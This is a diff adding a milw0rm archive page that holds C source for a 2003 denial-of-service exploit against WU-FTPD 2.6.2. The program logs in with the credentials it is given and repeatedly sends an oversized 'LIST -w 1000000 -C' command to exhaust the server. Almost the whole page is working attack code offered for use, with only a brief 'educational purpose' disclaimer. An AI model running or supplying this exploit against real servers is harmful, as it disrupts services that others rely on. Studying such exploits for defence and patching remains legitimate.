@@ -1,0 +1,114 @@
+<html>
+<head>
+<title>milw0rm productions</title>
+<pre>
+/*
+*     (c) Rosiello Security
+*
+* Copyright Rosiello Security 2003
+*   All Rights reserved.
+*
+* Tested on Red Hat 9.0
+*
+* Author: Angelo Rosiello
+* Mail  : angelo rosiello org
+* This software is only for educational purpose.
+* Do not use it against machines different from yours.
+* Respect law.
+*
+*/
+
+#include &lt;stdio.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;sys/socket.h&gt;
+#include &lt;netinet/in.h&gt;
+#include &lt;string.h&gt;
+
+void addr_initialize( );
+void usage( );
+
+int main( int argc, char **argv )
+{
+	int i, sd, PORT, loop, error;
+	char user[30], password[30], ch;
+	struct sockaddr_in server_addr;
+
+        fprintf( stdout, &quot;\n(c) Rosiello Security 2003\n&quot; );
+        fprintf( stdout, &quot;http://www.rosiello.org\n&quot; );
+        fprintf( stdout, &quot;WU-FTPD 2.6.2 Freezer by Angelo Rosiello\n\n&quot; );
+
+	if( argc != 6 ) usage( argv[0] );
+
+	if( strlen( argv[3] ) &gt; 20 ) exit( 0 );
+	if( strlen( argv[4] ) &gt; 20 ) exit( 0 );
+
+	sprintf( user, &quot;USER %s\n&quot;, argv[3] );
+	sprintf( password, &quot;PASS %s\n&quot;, argv[4] );
+
+	PORT = atoi( argv[2] );
+	loop = atoi( argv[5] );
+
+	addr_initialize( &amp;server_addr, PORT, ( long )inet_addr( argv[1] ));
+	sd = socket( AF_INET, SOCK_STREAM, 0 );
+
+  	error = connect( sd, ( struct sockaddr * ) &amp;server_addr, sizeof( server_addr ));
+	if( error != 0 )
+	{
+		perror( &quot;Something wrong with the connection&quot; );
+		exit( 0 );
+	}
+
+	while ( ch != '\n' )
+        {
+                recv( sd, &amp;ch, 1, 0);
+                printf(&quot;%c&quot;, ch );
+        }
+
+	ch = '\0';
+
+	printf( &quot;Connection executed, now waiting to log in...\n&quot; );
+
+	printf( &quot;%s&quot;, user );
+
+	send( sd, user, strlen( user ), 0 );
+	while ( ch != '\n' )
+	{
+		recv( sd, &amp;ch, 1, 0);
+		printf(&quot;%c&quot;, ch );
+	}
+	printf( &quot;%s&quot;, password );
+
+	ch = '\0';
+
+ 	send( sd, password, strlen( password ), 0 );
+        while ( ch != '\n' )
+        {
+                recv( sd, &amp;ch, 1, 0);
+                printf(&quot;%c&quot;, ch );
+        }
+
+	printf( &quot;Sending the DoS query\n&quot; );
+	for( i=0; i&lt;loop; i++ )
+	{
+		write( sd, &quot;LIST -w 1000000 -C\n&quot;, 19 );
+	}
+	printf( &quot;All done\n&quot; );
+	close( sd );
+	return 0;
+}
+
+void addr_initialize (struct sockaddr_in *address, int port, long IPaddr)
+{
+     	address -&gt; sin_family = AF_INET;
+     	address -&gt; sin_port = htons((u_short)port);
+     	address -&gt; sin_addr.s_addr = IPaddr;
+}
+
+void usage( char *program )
+{
+	fprintf(stdout, &quot;USAGE: &lt;%s&gt; &lt;IP&gt; &lt;PORT&gt; &lt;USER&gt; &lt;PASS&gt; &lt;LOOP&gt;\n&quot;, program);
+  	exit(0);
+}
+</pre>
+//downloaded from milw0rm.com
+</html>
